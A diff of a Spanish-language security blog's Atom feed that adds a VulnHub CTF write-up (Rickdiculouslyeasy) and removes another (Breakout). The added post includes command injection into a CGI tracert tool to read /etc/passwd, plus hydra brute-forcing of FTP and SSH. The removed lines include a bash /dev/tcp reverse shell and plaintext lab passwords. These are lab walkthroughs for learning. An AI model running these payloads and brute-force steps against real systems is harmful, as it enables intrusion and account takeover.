@@ -1,4 +1,322 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-08-09T14:19:48+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">TheZombrex</title><subtitle>TheZombrex blog</subtitle><author><name>TheZombrex</name></author><entry><title type="html">The Planets: Earth</title><link href="http://localhost:4000/vulnhub/the_planets_earth/" rel="alternate" type="text/html" title="The Planets: Earth" /><published>2022-08-09T00:00:00+02:00</published><updated>2022-08-09T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/the_planets_earth</id><content type="html" xml:base="http://localhost:4000/vulnhub/the_planets_earth/"><![CDATA[<p><a href="https://www.vulnhub.com/entry/the-planets-earth,755/">https://www.vulnhub.com/entry/the-planets-earth,755/</a></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-08-14T21:03:03+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">TheZombrex</title><subtitle>TheZombrex blog</subtitle><author><name>TheZombrex</name></author><entry><title type="html">Rickdiculouslyeasy: 1</title><link href="http://localhost:4000/vulnhub/rickdiculouslyeasy/" rel="alternate" type="text/html" title="Rickdiculouslyeasy: 1" /><published>2022-08-14T00:00:00+02:00</published><updated>2022-08-14T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/rickdiculouslyeasy</id><content type="html" xml:base="http://localhost:4000/vulnhub/rickdiculouslyeasy/"><![CDATA[<p><a href="https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/">https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/</a></p>
+
+<p>Realizar un escaneo nmap a la red para buscar el equipo</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 192.168.122.0/24
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/1.png" alt="image-center" class="align-center" /></p>
+
+<p>Saldrá una máquina con varios puertos abiertos</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/2.png" alt="image-center" class="align-center" /></p>
+
+<p>Realizar un escaneo nmap profundo</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-O</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> 192.168.122.11 <span class="nt">-oG</span> allports
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/3.png" alt="image-center" class="align-center" /></p>
+
+<p>Se podrá encontrar una flag entre toda la información</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/4.png" alt="image-center" class="align-center" /></p>
+
+<p>Entrar en la web</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/5.png" alt="image-center" class="align-center" /></p>
+
+<p>Buscar directorios ocultos en la web, aparecerá un <code class="language-plaintext highlighter-rouge">robots.txt</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> 192.168.122.11 <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/6.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a <code class="language-plaintext highlighter-rouge">/passwords</code>, saldrá una flag y un archivo llamado <code class="language-plaintext highlighter-rouge">passwords.html</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/7.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a flag, mostrará una de las flags</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/8.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a passwords.html</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/9.png" alt="image-center" class="align-center" /></p>
+
+<p>Mostrar el código fuente, mostrará una contraseña</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/10.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a <code class="language-plaintext highlighter-rouge">robots.txt</code> también visto con el gobuster, mostrará tres rutas</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/11.png" alt="image-center" class="align-center" /></p>
+
+<p>El primer directorio no mostrará nada relevante
+Ir al segundo directorio <code class="language-plaintext highlighter-rouge">/cgi-bin-tracertool.cgi</code>, mostrará una herramienta que servirá para ejecutar un tracert desde la máquina víctima a una IP que sea escrita</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/12.png" alt="image-center" class="align-center" /></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/13.png" alt="image-center" class="align-center" /></p>
+
+<p>Al probar a concatenar comandos funcionará. Es importante cerrar el tracert con un punto y coma para seguidamente introducir el comando deseado como se ve en la imagen.</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/14.png" alt="image-center" class="align-center" /></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/15.png" alt="image-center" class="align-center" /></p>
+
+<p>Tratar de mostrar archivos del equipo, en este caso el <code class="language-plaintext highlighter-rouge">/etc/passwd</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span> <span class="nb">tail</span> /etc/pass
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/16.png" alt="image-center" class="align-center" /></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/17.png" alt="image-center" class="align-center" /></p>
+
+<p>Aparecerán varios usuarios que añadiremos en un diccionario de usuarios, los usuarios son:</p>
+
+<ul>
+  <li>RickSanchez</li>
+  <li>Summer</li>
+  <li>Morty
+Añadirlos a un diccionario de usuarios del siguiente modo</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="o">&gt;&gt;</span> users.txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/18.png" alt="image-center" class="align-center" /></p>
+
+<p>Buscar el usuario al que pertenece la contraseña vista anteriormente en <code class="language-plaintext highlighter-rouge">passwords.html</code> utilizando hydra y el diccionario creado en el paso anterior, en este caso será al servidor ftp. Saldrá que la contraseña es del usuario <code class="language-plaintext highlighter-rouge">Summer</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>hydra <span class="nt">-L</span> users.txt <span class="nt">-p</span> winter 192.168.122.11 ftp
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/19.png" alt="image-center" class="align-center" /></p>
+
+<p>Entrar por ftp con el usuario <code class="language-plaintext highlighter-rouge">Summer</code> y la contraseña <code class="language-plaintext highlighter-rouge">winter</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 192.168.122.11
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/20.png" alt="image-center" class="align-center" /></p>
+
+<p>Descargar el archivo <code class="language-plaintext highlighter-rouge">FLAG.txt</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get FLAG.txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/21.png" alt="image-center" class="align-center" /></p>
+
+<p>Leer el archivo <code class="language-plaintext highlighter-rouge">FLAG.txt</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>FLAG.txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/22.png" alt="image-center" class="align-center" /></p>
+
+<p>Tratar de entrar por ftp de forma anónima</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 192.168.122.11
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/23.png" alt="image-center" class="align-center" /></p>
+
+<p>Descargar el archivo <code class="language-plaintext highlighter-rouge">FLAG.txt</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get FLAG.txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/24.png" alt="image-center" class="align-center" /></p>
+
+<p>Leer el archivo <code class="language-plaintext highlighter-rouge">FLAG.txt</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>FLAG.txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/25.png" alt="image-center" class="align-center" /></p>
+
+<p>Tratar de entrar por ssh con el usuario Summer y la contraseña <code class="language-plaintext highlighter-rouge">winter</code>. Como se puede ver en los puertos aparecen <code class="language-plaintext highlighter-rouge">22</code> y <code class="language-plaintext highlighter-rouge">22222</code>. Esto es porque el servidor SSH ha sido configurado para usar el puerto <code class="language-plaintext highlighter-rouge">22222</code>, es por esto que habrá que especificarlo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh Summer@192.168.122.11 <span class="nt">-p</span> 22222  
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/26.png" alt="image-center" class="align-center" /></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/27.png" alt="image-center" class="align-center" /></p>
+
+<p>Dará acceso al equipo, mostrar el contenido del directorio actual.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span>
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/28.png" alt="image-center" class="align-center" /></p>
+
+<p>Al intentar leer el archivo FLAG.txt con el comando cat aparecerá un gato, esto obliga a utilizar otro método para leerlo como puede ser el comando <code class="language-plaintext highlighter-rouge">tail</code>, <code class="language-plaintext highlighter-rouge">head</code> o <code class="language-plaintext highlighter-rouge">base64</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>FLAG.txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/29.png" alt="image-center" class="align-center" /></p>
+
+<p>Usar <code class="language-plaintext highlighter-rouge">tail</code> para leer el archivo</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tail </span>FLAG.txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/30.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al directorio anterior y mostrar el contenido para mostrar los directorios personales de los otros usuarios del sistema</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ..
+<span class="nb">ls</span>
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/31.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir a Morty y mostrar el contenido</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>Morty/
+<span class="nb">ls</span>
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/32.png" alt="image-center" class="align-center" /></p>
+
+<p>Comprobar que el archivo <code class="language-plaintext highlighter-rouge">Safe_Password.jpg</code> es realmente una imagen</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file Safe_Password.jpg
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/33.png" alt="image-center" class="align-center" /></p>
+
+<p>Leer el contenido del archivo para comprobar que no haya nada oculto en el código de la imagen , mostrará una contraseña que es <code class="language-plaintext highlighter-rouge">Meeseek</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">head </span>Safe_Password.jpg
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/34.png" alt="image-center" class="align-center" /></p>
+
+<p>Descomprimir el archivo <code class="language-plaintext highlighter-rouge">journal.txt.zip</code> con la contraseña Meeseek, mostrará otra flag y también la contraseña para algún archivo que es seguro</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unzip <span class="nt">-c</span> journal.txt.zip
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/35.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al directorio personal de <code class="language-plaintext highlighter-rouge">RickSanchez</code> y dentro de él a <code class="language-plaintext highlighter-rouge">RICKS_SAFE/</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ../RickSanchez
+<span class="nb">ls
+cd </span>RICKS_SAFE/
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/36.png" alt="image-center" class="align-center" /></p>
+
+<p>Al tratar de ejecutar el archivo no será posible por los permisos</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./safe
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/37.png" alt="image-center" class="align-center" /></p>
+
+<p>Copiar el archivo al directorio personal de Summer</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp </span>safe ../../Summer/
+<span class="nb">cd</span>
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/38.png" alt="image-center" class="align-center" /></p>
+
+<p>Ejecutar el script con la contraseña conseguida anteriormente en el archivo comprimido de Morty. Mostrará una pista para otra contraseña, la pista es que la contraseña cumple los siguientes requisitos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./safe 131333
+</code></pre></div></div>
+<ul>
+  <li>Una letra mayúscula</li>
+  <li>Un dígito</li>
+  <li>Una de las palabras del nombre de su antigua banda</li>
+</ul>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/39.png" alt="image-center" class="align-center" /></p>
+
+<p>Al buscar información sobre su antigua banda se podrá encontrar el nombre de <code class="language-plaintext highlighter-rouge">"The Flesh Curtains"</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/40.png" alt="image-center" class="align-center" /></p>
+
+<p>Crear un diccionario de contraseñas utilizando <code class="language-plaintext highlighter-rouge">Maskprocessor</code>, este programa permite crear ficcionarios especificando patrones. (ZSH no rinde bien con caracteres especiales cómo “?”, por ello utilizo bash para este paso)</p>
+
+<p><code class="language-plaintext highlighter-rouge">mp64 ?u?dCurtains      &lt;- ?u Significará una letra mayúscula, ?d Significará un dígito del 0 al 9</code></p>
+
+<p>Especificar tanto para los nombres flesh y curtains tanto en mayúscula como en minúscula</p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/41.png" alt="image-center" class="align-center" /></p>
+
+<p>Utilizar <code class="language-plaintext highlighter-rouge">hydra</code> para encontrar la contraseña del usuario RickSanchez con el diccionario creado anteriormente y con el puerto 22222. Después de un tiempo mostrará la contraseña del usuario RickSanchez</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>hydra <span class="nt">-t</span> 64 <span class="nt">-l</span> RickSanchez <span class="nt">-P</span> names.txt 192.168.122.11 ssh <span class="nt">-s</span> 22222
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/42.png" alt="image-center" class="align-center" /></p>
+
+<p>Cambiar al usuario RickSanshez</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su RickSanchez
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/43.png" alt="image-center" class="align-center" /></p>
+
+<p>Ver los permisos de RickSanchez, mostrará que tiene todos los permisos</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/44.png" alt="image-center" class="align-center" /></p>
+
+<p>Cambiar al usuario root</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/45.png" alt="image-center" class="align-center" /></p>
+
+<p>Ir al directorio /root y mostrar el contenido</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /root
+<span class="nb">ls</span>
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/46.png" alt="image-center" class="align-center" /></p>
+
+<p>Leer el archivo FLAG.txt</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tail </span>FLAG.txt
+</code></pre></div></div>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/47.png" alt="image-center" class="align-center" /></p>
+
+<p>Puede encontrarse otra flag accediendo a le web con el puerto <code class="language-plaintext highlighter-rouge">9090</code></p>
+
+<p><img src="http://localhost:4000/assets/images/vulnhub/rickdiculouslyeasy/48.png" alt="image-center" class="align-center" /></p>
+
+<h2 id="flags">Flags</h2>
+
+<p>FLAG:{TheyFoundMyBackDoorMorty}-10Points\n”)</p>
+
+<p>FLAG{Yeah d- just don’t do it.} - 10 Points</p>
+
+<p>FLAG{Whoa this is unexpected} - 10 Points</p>
+
+<p>FLAG{Get off the high road Summer!} - 10 Points</p>
+
+<p>FLAG: {131333} - 20 Points</p>
+
+<p>FLAG{And Awwwaaaaayyyy we Go!} - 20 Points</p>
+
+<p>FLAG: {Ionic Defibrillator} - 30 points</p>
+
+<p>FLAG {There is no Zeus, in your face!} - 10 Points</p>
+
+<p>Total 120/130</p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Rickdiculouslyeasy: 1.]]></summary></entry><entry><title type="html">The Planets: Earth</title><link href="http://localhost:4000/vulnhub/the_planets_earth/" rel="alternate" type="text/html" title="The Planets: Earth" /><published>2022-08-09T00:00:00+02:00</published><updated>2022-08-09T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/the_planets_earth</id><content type="html" xml:base="http://localhost:4000/vulnhub/the_planets_earth/"><![CDATA[<p><a href="https://www.vulnhub.com/entry/the-planets-earth,755/">https://www.vulnhub.com/entry/the-planets-earth,755/</a></p>
 
 <p>Realizar un escaneo nmap a la red para buscar el equipo</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 192.168.122.0/24
@@ -34,7 +352,7 @@
 
 <p><img src="http://localhost:4000/assets/images/vulnhub/earth/7.png" alt="image-center" class="align-center" /></p>
 
-<p>Realizar un escaneo nmap a ambas DNS como https</p>
+<p>Realizar un escaneo con gobuster a ambas DNS como https</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> https://earth.local <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-k</span>
 </code></pre></div></div>
 
@@ -160,7 +478,7 @@ Flag: <span class="o">[</span>user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
 
 <p><img src="http://localhost:4000/assets/images/vulnhub/earth/29.png" alt="image-center" class="align-center" /></p>
 
-<p>Asegurar que se tiene instalado <code class="language-plaintext highlighter-rouge">strace</code>, sino instalarlo</p>
+<p>Asegurar que se tiene instalado <code class="language-plaintext highlighter-rouge">strace</code>, si no instalarlo</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install</span> –y strace
 </code></pre></div></div>
 
@@ -1348,150 +1666,4 @@ Copiar el contenido de <code class="language-plaintext highlighter-rouge">/usr/s
 
 <p>Dará acceso mostrando un mensaje con el flag</p>
 
-<p><img src="http://localhost:4000/assets/images/htb/appointment/3.png" alt="image-center" class="align-center" /></p>]]></content><author><name>TheZombrex</name></author><category term="hackthebox" /><category term="hackthebox" /><category term="StartingPoint" /><category term="writeup" /><summary type="html"><![CDATA[[StartingPoint][HackTheBox] Writeup de appointment.]]></summary></entry><entry><title type="html">Breakout</title><link href="http://localhost:4000/vulnhub/breakout/" rel="alternate" type="text/html" title="Breakout" /><published>2022-07-30T00:00:00+02:00</published><updated>2022-07-30T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/breakout</id><content type="html" xml:base="http://localhost:4000/vulnhub/breakout/"><![CDATA[<p><a href="https://www.vulnhub.com/series/empire,507/">https://www.vulnhub.com/series/empire,507/</a></p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> 192.168.1.0/24
-</code></pre></div></div>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/1.png" alt="image-center" class="align-center" /></p>
-
-<p>Saldrá la máquina breakout</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/2.png" alt="image-center" class="align-center" /></p>
-
-<p>Entrar al servidor web con la dirección <code class="language-plaintext highlighter-rouge">192.168.1.146</code>, saldrá la web por defecto de Apache</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/3.png" alt="image-center" class="align-center" /></p>
-
-<p>Dar click derecho e inspeccionar elemento y saldrá un mensaje encriptado</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/4.png" alt="image-center" class="align-center" /></p>
-
-<p>Usar el identificador de cifrado de la web decode.fr, dirá que es cifrado Brainfuck</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/5.png" alt="image-center" class="align-center" /></p>
-
-<p>Usar el descifrador Brainfuck</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/6.png" alt="image-center" class="align-center" /></p>
-
-<p>Tratar de intentar entrar al servidor web con otro de los puertos abiertos, en este caso el 20000</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/7.png" alt="image-center" class="align-center" /></p>
-
-<p>Dirá que es un servidor bajo SSL por lo que recomienda acceder con https en lugar de http, cambiamos y saldrá la advertencia de sitio inseguro</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/8.png" alt="image-center" class="align-center" /></p>
-
-<p>Pulsar en avanzado y en aceptar el riesgo y continuar</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/9.png" alt="image-center" class="align-center" /></p>
-
-<p>Saldrá un login para Usermin</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/10.png" alt="image-center" class="align-center" /></p>
-
-<p>Usar enum4linux para descubrir el usuario que se encuentra en el equipo</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/11.png" alt="image-center" class="align-center" /></p>
-
-<p>Saldrá el usuario cyber</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/12.png" alt="image-center" class="align-center" /></p>
-
-<p>Usar el usuario cyber y la contraseña descifrada anteriormente</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/13.png" alt="image-center" class="align-center" /></p>
-
-<p>Cargará el siguiente panel</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/14.png" alt="image-center" class="align-center" /></p>
-
-<p>En la parte inferior se encontrarán unos botones, uno de ellos permitirá abrir una shell</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/15.png" alt="image-center" class="align-center" /></p>
-
-<p>Entrará al directorio personal de cyber y con dicho usuario</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/16.png" alt="image-center" class="align-center" /></p>
-
-<p>Listar el contenido, mostrará un archivo llamado <code class="language-plaintext highlighter-rouge">user.txt</code></p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/17.png" alt="image-center" class="align-center" /></p>
-
-<p>Mostrará el flag del usuario</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/18.png" alt="image-center" class="align-center" /></p>
-
-<p>Usar el comando <code class="language-plaintext highlighter-rouge">getcap</code> con el archivo tar</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/19.png" alt="image-center" class="align-center" /></p>
-
-<p>Ir a <code class="language-plaintext highlighter-rouge">/var/backups</code> y mostrar el contenido</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/20.png" alt="image-center" class="align-center" /></p>
-
-<p>Volver al home de cyber y usar el archivo tar para comprimir el archivo <code class="language-plaintext highlighter-rouge">.old_pass.bak</code></p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/21.png" alt="image-center" class="align-center" /></p>
-
-<p>Descomprimir el archivo creado</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/22.png" alt="image-center" class="align-center" /></p>
-
-<p>Se creará un directorio llamado var, dentro de él otro llamado backups y dentro de este estará el archivo <code class="language-plaintext highlighter-rouge">.old_pass.bak</code> que ahora se podrá leer</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/23.png" alt="image-center" class="align-center" /></p>
-
-<p>Mostrará una contraseña para el usuario root</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/24.png" alt="image-center" class="align-center" /></p>
-
-<p>Al tratar de usar el comando su no lo permitirá</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/25.png" alt="image-center" class="align-center" /></p>
-
-<p>Hacer un reverse shell con el comando</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash –i  <span class="o">&gt;</span>&amp; /dev/tcp/192.168.1.127/4444 0&gt;&amp;1
-</code></pre></div></div>
-
-<p>Y poner el puerto de escucha en 4444</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/26.png" alt="image-center" class="align-center" /></p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/27.png" alt="image-center" class="align-center" /></p>
-
-<p>Se abrirá un shell inverso aunque aún con el usuario cyber</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/28.png" alt="image-center" class="align-center" /></p>
-
-<p>Hacer de nuevo un cat al archivo para poder copiar la contraseña</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/29.png" alt="image-center" class="align-center" /></p>
-
-<p>Cambiar de usuario con su, cambiará al usuario root aunque sin mostrar texto, de todos modos se pueden escribir comandos</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/30.png" alt="image-center" class="align-center" /></p>
-
-<p>Ir al directorio de root y mostrar el contenido</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/31.png" alt="image-center" class="align-center" /></p>
-
-<p>Mostrará el flag del usuario root</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/32.png" alt="image-center" class="align-center" /></p>
-
-<h2 id="usuarios-y-contraseñas">Usuarios y contraseñas</h2>
-
-<p>Cyber= .2uqPEfj3D&lt;P’a-3
-Root= Ts&amp;4&amp;YurgtRX(=~h</p>
-
-<h2 id="flags">Flags</h2>
-
-<p>Usuario:  3mp!r3{You_Manage_To_Break_To_My_Secure_Access}</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/33.png" alt="image-center" class="align-center" /></p>
-
-<p>Root: 3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}</p>
-
-<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/34.png" alt="image-center" class="align-center" /></p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Breakout.]]></summary></entry></feed>
